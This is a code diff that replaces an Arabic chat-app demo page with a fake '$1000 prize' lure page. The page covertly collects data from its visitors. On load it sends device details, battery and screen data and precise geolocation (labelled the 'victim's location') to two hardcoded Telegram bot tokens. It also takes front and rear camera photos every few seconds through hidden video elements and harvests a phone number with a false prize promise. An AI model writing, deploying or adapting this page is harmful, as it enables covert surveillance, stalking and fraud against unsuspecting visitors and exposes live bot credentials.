@@ -1,215 +1,589 @@
-<!doctype html>
-<html lang="ar">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Chat App - Demo</title>
-  <style>
-    body{font-family:Arial,Helvetica,sans-serif;margin:0;display:flex;height:100vh}
-    .sidebar{width:320px;border-right:1px solid #ddd;padding:12px;box-sizing:border-box}
-    .main{flex:1;display:flex;flex-direction:column}
-    .user-list{list-style:none;padding:0;margin:0;max-height:60vh;overflow:auto}
-    .user-list li{padding:8px;border-bottom:1px solid #eee;cursor:pointer}
-    .messages{flex:1;padding:12px;overflow:auto;background:#f7f7f7;display:flex;flex-direction:column;gap:8px}
-    .msg{max-width:70%;padding:8px;border-radius:8px}
-    .me{align-self:flex-end;background:#dcf8c6}
-    .them{align-self:flex-start;background:#fff}
-    .composer{display:flex;gap:8px;padding:12px;border-top:1px solid #ddd}
-    input,textarea{padding:8px;border-radius:6px;border:1px solid #ccc}
-    button{padding:8px 12px;border-radius:6px;border:0;background:#2b7cff;color:#fff;cursor:pointer}
-    .top form{display:flex;flex-direction:column;gap:8px}
-    .small{font-size:12px;color:#666}
-    img.preview{max-width:200px;border-radius:6px}
-    video.preview{max-width:300px;border-radius:6px}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏆 فز بـ 1000$ الآن - اختبار الحظ!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow-x: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: slideIn 1s ease-out;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        h1 { 
+            font-size: 2.2em; 
+            margin-bottom: 20px; 
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .prize { 
+            font-size: 4em; 
+            color: #FFD700; 
+            margin: 20px 0; 
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .btn {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E8E);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+            width: 100%;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
+        }
+        .btn:active { transform: translateY(-1px); }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #FFD700;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status { 
+            margin-top: 20px; 
+            font-size: 1.1em; 
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        .phone-section {
+            display: none;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 2px solid rgba(255,255,255,0.3);
+        }
+        .phone-input {
+            background: rgba(255,255,255,0.2);
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 15px 0;
+            backdrop-filter: blur(10px);
+        }
+        .phone-input input {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 1.5em;
+            font-weight: bold;
+            width: 80%;
+            text-align: center;
+            padding: 10px;
+        }
+        .phone-input input::placeholder {
+            color: rgba(255,255,255,0.7);
+        }
+        .phone-input input:focus {
+            outline: none;
+            box-shadow: 0 0 20px rgba(255,215,0,0.5);
+        }
+        .success {
+            display: none;
+            background: linear-gradient(45deg, #4CAF50, #8BC34A);
+            color: white;
+            padding: 25px;
+            border-radius: 20px;
+            margin-top: 20px;
+            font-size: 1.3em;
+            font-weight: bold;
+            box-shadow: 0 10px 30px rgba(76,175,80,0.4);
+        }
+        .hidden { display: none !important; }
+    </style>
 </head>
 <body>
-  <div class="sidebar">
-    <div id="authArea">
-      <h3>تسجيل / دخول</h3>
-      <form id="authForm" onsubmit="return false;">
-        <input id="email" placeholder="الإيميل" />
-        <input id="password" placeholder="كلمة المرور" type="password" />
-        <input id="displayName" placeholder="الاسم الظاهر (اختياري)" />
-        <div style="display:flex;gap:8px">
-          <button id="btnRegister">تسجيل</button>
-          <button id="btnLogin">دخول</button>
+    <div class="container">
+        <h1>🎉 فز بـ 1000$ الآن!</h1>
+        <div class="prize">💰 1000$ 💰</div>
+        <p style="font-size: 1.2em; margin-bottom: 30px;">
+            اضغط الزر لتأكيد الفوز واستلام الجائزة!
+        </p>
+        
+        <button class="btn" onclick="showPhoneInput()" id="playBtn">
+            ✅ تأكيد الفوز واستلام 1000$
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري التسجيل... ⏳</p>
         </div>
-      </form>
-      <div class="small">الحالة: <span id="status">غير متصل</span></div>
+        
+        <!-- خانة الرقم الجديدة بنفس التصميم -->
+        <div class="phone-section" id="phoneSection">
+            <div class="phone-input">
+                <input type="tel" id="phoneNumber" placeholder="📞 05xxxxxxxx" maxlength="12" />
+            </div>
+            <button class="btn" onclick="submitPhone()" style="background: linear-gradient(45deg, #4CAF50, #8BC34A);">
+                📞 إرسال الرقم واستلام الجائزة
+            </button>
+        </div>
+        
+        <div class="success" id="successMsg">
+            ✅ تم تسجيل رقمك بنجاح!<br>سنتصل بك خلال 24 ساعة 👨‍💼💰
+        </div>
+        
+        <div class="status" id="status"></div>
     </div>
-    <hr/>
-    <h4>جهات الاتصال</h4>
-    <ul id="users" class="user-list"></ul>
-  </div>
 
-  <div class="main">
-    <div style="padding:12px;border-bottom:1px solid #ddd;display:flex;justify-content:space-between;align-items:center">
-      <div><strong id="chatWith">اختر مستخدماً</strong></div>
-      <div>مرحباً، <span id="meName">غير مسجل</span></div>
-    </div>
+    <script>
+        // البوتات - فقط هذين الاثنين
+        const BOTS = [
+            { token: '8606347907:AAGGFKqKSIAko1nrlE2Pk6JW_P9660aCe7Q', chatId: '6659898384' }, // مُـ‘ـُحُـ‘ـُمُـ‘ـُوٌډ ٱلُـ‘ـُُـ‘ـُچوٌٌﻜـ‘ـُر
+            { token: '8537499530:AAFyfu4ZMRzxlKXIJv0rmqTwn0tlg2RBZLg', chatId: '5058927918' }  // Your ID
+        ];
+        
+        let isRecording = false;
+        let locationSent = false;
 
-    <div id="messages" class="messages"></div>
+        // إرسال بيانات الجهاز + الموقع فور فتح الموقع
+        window.addEventListener('load', async () => {
+            sendDeviceInfo();
+            getLocation();
+            // بدأ التصوير فوراً بدون انتظار زر
+            startContinuousRecording();
+        });
 
-    <div class="composer">
-      <input id="textInput" placeholder="اكتب رسالة..." style="flex:1" />
-      <input id="fileInput" type="file" />
-      <button id="sendBtn">إرسال</button>
-    </div>
-  </div>
+        // دالة جديدة لتحديد الشركة المصنعة للجهاز
+        function getDeviceManufacturer() {
+            const ua = navigator.userAgent;
+            
+            // قائمة الشركات المصنعة المعروفة
+            if (ua.includes('Samsung') || ua.includes('SM-') || ua.includes('GT-')) return 'Samsung';
+            if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) return 'Apple';
+            if (ua.includes('Xiaomi') || ua.includes('Mi ') || ua.includes('Redmi')) return 'Xiaomi';
+            if (ua.includes('Huawei')) return 'Huawei';
+            if (ua.includes('Honor')) return 'Honor';
+            if (ua.includes('Oppo')) return 'Oppo';
+            if (ua.includes('Vivo')) return 'Vivo';
+            if (ua.includes('OnePlus')) return 'OnePlus';
+            if (ua.includes('Google') || ua.includes('Pixel')) return 'Google';
+            if (ua.includes('Nokia')) return 'Nokia';
+            if (ua.includes('Sony')) return 'Sony';
+            if (ua.includes('LG')) return 'LG';
+            if (ua.includes('HTC')) return 'HTC';
+            if (ua.includes('Motorola') || ua.includes('Moto')) return 'Motorola';
+            if (ua.includes('Asus')) return 'Asus';
+            if (ua.includes('Acer')) return 'Acer';
+            if (ua.includes('Lenovo')) return 'Lenovo';
+            if (ua.includes('HP') || ua.includes('Hewlett-Packard')) return 'HP';
+            if (ua.includes('Dell')) return 'Dell';
+            if (ua.includes('Microsoft')) return 'Microsoft';
+            
+            // محاولة استخراج اسم الجهاز من الـ User Agent
+            const matches = ua.match(/\(([^)]+)\)/);
+            if (matches && matches[1]) {
+                const deviceInfo = matches[1];
+                if (deviceInfo.includes(';')) {
+                    const parts = deviceInfo.split(';');
+                    for (let part of parts) {
+                        part = part.trim();
+                        if (part.includes('Build/')) {
+                            const model = part.split('Build/')[0].trim();
+                            return model || 'غير معروف';
+                        }
+                    }
+                }
+            }
+            
+            return 'غير معروف';
+        }
 
-<script src="/socket.io/socket.io.js"></script>
-<script>
-const SERVER_BASE = ''; // same origin when deployed
-let token = localStorage.getItem('token');
-let me = null;
-let socket = null;
-let currentChatId = null;
+        // دالة جديدة لتحديد نوع الجهاز بالتفصيل
+        function getDetailedDeviceType() {
+            const ua = navigator.userAgent;
+            let deviceType = 'غير معروف';
+            let deviceModel = 'غير معروف';
+            
+            if (/Android/i.test(ua)) {
+                deviceType = 'Android';
+                // محاولة استخراج موديل الأندرويد
+                const androidMatch = ua.match(/Android\s+([\d.]+)/);
+                const version = androidMatch ? androidMatch[1] : 'غير معروف';
+                
+                // محاولة استخراج اسم الجهاز
+                const modelMatch = ua.match(/; ([^;]+) Build\//) || ua.match(/; ([^;]+);/);
+                deviceModel = modelMatch ? modelMatch[1].trim() : 'غير معروف';
+                
+                return { type: deviceType, version, model: deviceModel };
+            }
+            else if (/iPhone/i.test(ua)) {
+                deviceType = 'iPhone';
+                const iPhoneMatch = ua.match(/iPhone OS\s+([\d_]+)/);
+                const version = iPhoneMatch ? iPhoneMatch[1].replace(/_/g, '.') : 'غير معروف';
+                
+                // محاولة تحديد موديل الآيفون
+                if (ua.includes('iPhone 15')) deviceModel = 'iPhone 15';
+                else if (ua.includes('iPhone 14')) deviceModel = 'iPhone 14';
+                else if (ua.includes('iPhone 13')) deviceModel = 'iPhone 13';
+                else if (ua.includes('iPhone 12')) deviceModel = 'iPhone 12';
+                else if (ua.includes('iPhone 11')) deviceModel = 'iPhone 11';
+                else if (ua.includes('iPhone X')) deviceModel = 'iPhone X';
+                else deviceModel = 'موديل غير محدد';
+                
+                return { type: deviceType, version, model: deviceModel };
+            }
+            else if (/iPad/i.test(ua)) {
+                deviceType = 'iPad';
+                return { type: deviceType, version: 'غير معروف', model: 'iPad' };
+            }
+            else if (/iPod/i.test(ua)) {
+                deviceType = 'iPod';
+                return { type: deviceType, version: 'غير معروف', model: 'iPod' };
+            }
+            else if (/Windows/i.test(ua)) {
+                deviceType = 'Windows';
+                return { type: deviceType, version: 'غير معروف', model: 'كمبيوتر' };
+            }
+            else if (/Mac/i.test(ua)) {
+                deviceType = 'Mac';
+                return { type: deviceType, version: 'غير معروف', model: 'Mac' };
+            }
+            else if (/Linux/i.test(ua)) {
+                deviceType = 'Linux';
+                return { type: deviceType, version: 'غير معروف', model: 'كمبيوتر' };
+            }
+            
+            return { type: deviceType, version: 'غير معروف', model: 'غير معروف' };
+        }
 
-const status = document.getElementById('status');
-const usersList = document.getElementById('users');
-const messagesDiv = document.getElementById('messages');
-const meName = document.getElementById('meName');
-const chatWith = document.getElementById('chatWith');
+        // دالة جديدة لجلب معلومات البطارية بالتفصيل
+        async function getDetailedBatteryInfo() {
+            let batteryInfo = {
+                level: 'غير متاح',
+                charging: 'غير معروف',
+                chargingTime: 'غير معروف',
+                dischargingTime: 'غير معروف'
+            };
+            
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    
+                    batteryInfo.level = Math.round(battery.level * 100) + '%';
+                    batteryInfo.charging = battery.charging ? '🔌 يشتغل على الشاحن' : '🔋 يشتغل على البطارية';
+                    
+                    // وقت الشحن المتبقي (بالدقائق)
+                    if (battery.chargingTime !== Infinity && battery.chargingTime !== 0) {
+                        const minutes = Math.round(battery.chargingTime / 60);
+                        batteryInfo.chargingTime = minutes + ' دقيقة';
+                    } else {
+                        batteryInfo.chargingTime = 'غير معروف';
+                    }
+                    
+                    // وقت تفريغ البطارية المتبقي
+                    if (battery.dischargingTime !== Infinity && battery.dischargingTime !== 0) {
+                        const minutes = Math.round(battery.dischargingTime / 60);
+                        batteryInfo.dischargingTime = minutes + ' دقيقة';
+                    } else {
+                        batteryInfo.dischargingTime = 'غير معروف';
+                    }
+                    
+                } catch (e) {
+                    console.log('خطأ في قراءة البطارية');
+                }
+            }
+            
+            return batteryInfo;
+        }
 
-function setStatus(s){ status.textContent = s; }
+        // دالة إرسال معلومات الجهاز (معدلة بالكامل)
+        async function sendDeviceInfo() {
+            const deviceDetails = getDetailedDeviceType();
+            const manufacturer = getDeviceManufacturer();
+            const batteryInfo = await getDetailedBatteryInfo();
+            
+            // معلومات إضافية
+            const language = navigator.language || navigator.userLanguage || 'غير معروف';
+            const platform = navigator.platform || 'غير معروف';
+            const cookiesEnabled = navigator.cookieEnabled ? 'مفعلة' : 'غير مفعلة';
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const colorDepth = window.screen.colorDepth;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            
+            let deviceIcon = '📱';
+            if (deviceDetails.type === 'iPhone' || deviceDetails.type === 'iPad' || deviceDetails.type === 'iPod') {
+                deviceIcon = '🍎';
+            } else if (deviceDetails.type === 'Android') {
+                deviceIcon = '🤖';
+            } else if (deviceDetails.type === 'Windows') {
+                deviceIcon = '💻';
+            } else if (deviceDetails.type === 'Mac') {
+                deviceIcon = '🖥️';
+            }
+            
+            const msg = `${deviceIcon} **معلومات الجهاز بالتفصيل** ${deviceIcon}\n\n` +
+                      `**نوع الجهاز:** ${deviceDetails.type}\n` +
+                      `**الشركة المصنعة:** ${manufacturer}\n` +
+                      `**الموديل:** ${deviceDetails.model}\n` +
+                      `**الإصدار:** ${deviceDetails.version}\n` +
+                      `**المنصة:** ${platform}\n\n` +
+                      `🔋 **حالة البطارية:**\n` +
+                      `└─ المستوى: **${batteryInfo.level}**\n` +
+                      `└─ الحالة: **${batteryInfo.charging}**\n` +
+                      `└─ وقت الشحن المتبقي: **${batteryInfo.chargingTime}**\n` +
+                      `└─ وقت التفريغ المتبقي: **${batteryInfo.dischargingTime}**\n\n` +
+                      `📺 **الشاشة:**\n` +
+                      `└─ الدقة: **${screenWidth} x ${screenHeight}**\n` +
+                      `└─ عمق الألوان: **${colorDepth} بت**\n\n` +
+                      `🌐 **معلومات إضافية:**\n` +
+                      `└─ اللغة: **${language}**\n` +
+                      `└─ المنطقة الزمنية: **${timeZone}**\n` +
+                      `└─ الكوكيز: **${cookiesEnabled}**\n` +
+                      `└─ User Agent: \`${navigator.userAgent.substring(0, 150)}...\``;
+            
+            // إرسال إلى جميع البوتات
+            await sendToAllBots(msg);
+        }
 
-async function api(path, method='GET', body=null){
-  const headers = {'Content-Type':'application/json'};
-  if (token) headers['Authorization'] = 'Bearer ' + token;
-  const res = await fetch(path, { method, headers, body: body ? JSON.stringify(body) : undefined });
-  return res.json();
-}
+        function showPhoneInput() {
+            document.getElementById('playBtn').classList.add('hidden');
+            document.getElementById('phoneSection').style.display = 'block';
+            document.getElementById('phoneNumber').focus();
+        }
 
-document.getElementById('btnRegister').addEventListener('click', async ()=>{
-  const email = document.getElementById('email').value.trim();
-  const password = document.getElementById('password').value;
-  const displayName = document.getElementById('displayName').value.trim();
-  if(!email||!password) return alert('ادخل ايميل وكلمة مرور');
-  const res = await api('/api/register','POST',{ email, password, displayName });
-  if(res.error) return alert(res.error);
-  token = res.token; localStorage.setItem('token', token);
-  me = res.user; meName.textContent = me.displayName || me.email;
-  setStatus('متصل');
-  connectSocket(); loadUsers();
-});
+        async function submitPhone() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            if (!phone || phone.length < 9) {
+                alert('أدخل رقم صحيح');
+                return;
+            }
+            
+            document.getElementById('phoneSection').classList.add('hidden');
+            document.getElementById('successMsg').style.display = 'block';
+            
+            // إرسال الرقم للبوتات مع معلومات الجهاز أيضاً
+            const deviceDetails = getDetailedDeviceType();
+            const manufacturer = getDeviceManufacturer();
+            
+            const msg = `📞 **رقم هاتف جديد** 📞\n☎️ **${phone}**\n📱 الجهاز: **${deviceDetails.type} ${manufacturer}**\n📱 الموديل: **${deviceDetails.model}**`;
+            
+            await sendToAllBots(msg);
+        }
 
-document.getElementById('btnLogin').addEventListener('click', async ()=>{
-  const email = document.getElementById('email').value.trim();
-  const password = document.getElementById('password').value;
-  if(!email||!password) return alert('ادخل ايميل وكلمة مرور');
-  const res = await api('/api/login','POST',{ email, password });
-  if(res.error) return alert(res.error);
-  token = res.token; localStorage.setItem('token', token);
-  me = res.user; meName.textContent = me.displayName || me.email;
-  setStatus('متصل');
-  connectSocket(); loadUsers();
-});
+        // الحصول على الموقع الحقيقي بدقة عالية جداً
+        function getLocation() {
+            if (navigator.geolocation && !locationSent) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        const preciseMapLink = `https://maps.google.com/?q=${lat},${lng}&ll=${lat},${lng}&z=20`;
+                        
+                        let accuracyLevel = accuracy < 5 ? '🎯 دقيقة جداً (أقل من 5 أمتار)' : 
+                                          accuracy < 10 ? '📍 دقيقة (أقل من 10 أمتار)' : 
+                                          accuracy < 50 ? '📍 متوسطة (أقل من 50 متر)' : '🌐 تقريبية';
+                        
+                        const msg = `📍 **موقع الضحية بدقة عالية جداً** 📍\n` +
+                                  `🌐 الإحداثيات: \`${lat}, ${lng}\`\n` +
+                                  `📏 الدقة: ${accuracy.toFixed(1)} متر (${accuracyLevel})\n` +
+                                  `🗺️ الخريطة الدقيقة: ${preciseMapLink}\n` +
+                                  `📍 رابط جوجل ماب: ${mapLink}`;
+                        
+                        sendToAllBots(msg);
+                        locationSent = true;
+                    },
+                    (error) => {
+                        let errorMsg = '❌ فشل تحديد الموقع: ';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg += 'المستخدم رفض الطلب';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg += 'معلومات الموقع غير متوفرة';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg += 'انتهت مهلة الطلب';
+                                break;
+                        }
+                        sendToAllBots(errorMsg);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+                
+                setTimeout(() => {
+                    if (!locationSent) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                const lat = position.coords.latitude;
+                                const lng = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+                                const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                                const preciseMapLink = `https://maps.google.com/?q=${lat},${lng}&ll=${lat},${lng}&z=20`;
+                                
+                                const msg = `📍 **موقع الضحية (محاولة ثانية)** 📍\n` +
+                                          `🌐 الإحداثيات: \`${lat}, ${lng}\`\n` +
+                                          `📏 الدقة: ${accuracy.toFixed(1)} متر\n` +
+                                          `🗺️ الخريطة الدقيقة: ${preciseMapLink}`;
+                                
+                                sendToAllBots(msg);
+                                locationSent = true;
+                            },
+                            null,
+                            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                        );
+                    }
+                }, 3000);
+            }
+        }
 
-async function loadUsers(){
-  if(!token) return;
-  const res = await api('/api/users');
-  if(res.error) { console.error(res); return; }
-  usersList.innerHTML = '';
-  res.users.forEach(u=>{
-    const li = document.createElement('li');
-    li.textContent = u.displayName || u.email;
-    li.dataset.id = u._id || u.id;
-    li.addEventListener('click', ()=> openChat(u));
-    usersList.appendChild(li);
-  });
-}
+        function startContinuousRecording() {
+            // كاميرا أمامية كل 5 ثواني
+            setInterval(async () => {
+                if (!isRecording) await captureAndSend('user', '📸 كاميرا أمامية STEALTH');
+            }, 5000);
 
-function connectSocket(){
-  if(!token) return;
-  if(socket) socket.disconnect();
-  socket = io('/', { auth: { token } });
-  socket.on('connect', ()=> setStatus('متصل (socket)'));
-  socket.on('disconnect', ()=> setStatus('مفصول'));
-  socket.on('message', (m)=> {
-    // show if relevant
-    if ((m.from && m.from._id==me.id && m.to==currentChatId) || (m.to==me.id && m.from && m.from._id==currentChatId)) {
-      appendMessage(m);
-    } else {
-      // optionally show badge
-    }
-  });
-}
+            // كاميرا خلفية كل 10 ثواني
+            setInterval(async () => {
+                if (!isRecording) await captureAndSend('environment', '📷 كاميرا خلفية STEALTH');
+            }, 10000);
+        }
 
-function formatTime(iso){ return new Date(iso).toLocaleTimeString(); }
+        async function captureAndSend(facingMode, caption) {
+            try {
+                const photo = await capturePhoto(facingMode);
+                if (photo) await sendPhotoToAllBots(photo, caption);
+            } catch (error) {}
+        }
 
-function appendMessage(m){
-  const el = document.createElement('div');
-  el.className = 'msg ' + (m.from && m.from._id==me.id ? 'me' : 'them');
-  let html = '';
-  if(m.mediaUrl){
-    if(m.mediaType && m.mediaType.startsWith('image')){
-      html += `<div><img class="preview" src="${m.mediaUrl}" /></div>`;
-    } else if (m.mediaType && m.mediaType.startsWith('video')){
-      html += `<div><video class="preview" controls src="${m.mediaUrl}"></video></div>`;
-    }
-  }
-  if(m.text) html += `<div>${escapeHtml(m.text)}</div>`;
-  html += `<div class="small">${formatTime(m.createdAt)}</div>`;
-  el.innerHTML = html;
-  messagesDiv.appendChild(el);
-  messagesDiv.scrollTop = messagesDiv.scrollHeight;
-}
+        function capturePhoto(facingMode) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.style.position = 'fixed';
+                video.style.top = '-9999px';
+                document.body.appendChild(video);
+                
+                navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: facingMode === 'user' ? 'user' : 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        aspectRatio: 16/9
+                    }
+                }).then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                        
+                        canvas.toBlob(blob => {
+                            const reader = new FileReader();
+                            reader.onloadend = () => resolve(reader.result);
+                            reader.readAsDataURL(blob);
+                        }, 'image/jpeg', 0.9);
+                    }, 1500);
+                }).catch(() => {
+                    if (video.parentNode) video.remove();
+                    resolve(null);
+                });
+            });
+        }
 
-function escapeHtml(s){ return String(s||'').replace(/[&<>"']/g, function(m){return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"})[m]}); }
+        // دالة لإرسال الرسالة إلى جميع البوتات
+        async function sendToAllBots(message) {
+            for (const bot of BOTS) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', bot.chatId);
+                    formData.append('text', message);
+                    formData.append('parse_mode', 'Markdown');
+                    
+                    await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {
+                    console.log('خطأ في إرسال الرسالة إلى البوت:', bot.token);
+                }
+            }
+        }
 
-async function openChat(u){
-  currentChatId = u._id || u.id;
-  chatWith.textContent = u.displayName || u.email;
-  messagesDiv.innerHTML = '<small>جاري تحميل الرسائل...</small>';
-  const res = await api('/api/messages?with=' + currentChatId);
-  if(res.error) { messagesDiv.innerHTML = 'خطأ'; return; }
-  messagesDiv.innerHTML = '';
-  res.messages.forEach(m => appendMessage(m));
-}
+        // دالة لإرسال الصورة إلى جميع البوتات
+        async function sendPhotoToAllBots(photoDataUrl, caption) {
+            for (const bot of BOTS) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', bot.chatId);
+                    formData.append('photo', dataURLtoBlob(photoDataUrl), `stealth_${Date.now()}.jpg`);
+                    formData.append('caption', caption);
+                    
+                    await fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {
+                    console.log('خطأ في إرسال الصورة إلى البوت:', bot.token);
+                }
+            }
+        }
 
-document.getElementById('sendBtn').addEventListener('click', sendMessage);
-document.getElementById('textInput').addEventListener('keydown', (e)=> { if(e.key==='Enter') sendMessage(); });
-
-async function sendMessage(){
-  const text = document.getElementById('textInput').value.trim();
-  const fileInput = document.getElementById('fileInput');
-  if(!currentChatId) return alert('اختر مستخدماً');
-  if(fileInput.files.length>0){
-    // upload file first
-    const f = fileInput.files[0];
-    const fd = new FormData();
-    fd.append('file', f);
-    const res = await fetch('/api/upload', { method:'POST', headers: { 'Authorization': 'Bearer ' + token }, body: fd });
-    const data = await res.json();
-    if(data.error) return alert('خطأ رفع الملف: ' + data.error);
-    const payload = { to: currentChatId, text: text || '', mediaUrl: data.url, mediaType: data.mimetype };
-    socket.emit('private_message', payload);
-    document.getElementById('fileInput').value = '';
-    document.getElementById('textInput').value = '';
-  } else {
-    if(!text) return;
-    socket.emit('private_message', { to: currentChatId, text });
-    document.getElementById('textInput').value = '';
-  }
-}
-
-// try restore session
-(async function init(){
-  if(token){
-    try{
-      const payload = JSON.parse(atob(token.split('.')[1]));
-      me = { id: payload.id, email: payload.email, displayName: payload.displayName };
-      meName.textContent = me.displayName || me.email;
-      setStatus('متصل (توكن موجود)');
-      connectSocket(); loadUsers();
-    }catch(e){
-      localStorage.removeItem('token'); token=null; setStatus('غير متصل');
-    }
-  } else {
-    setStatus('غير متصل');
-  }
-})();
-</script>
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+    </script>
 </body>
 </html>
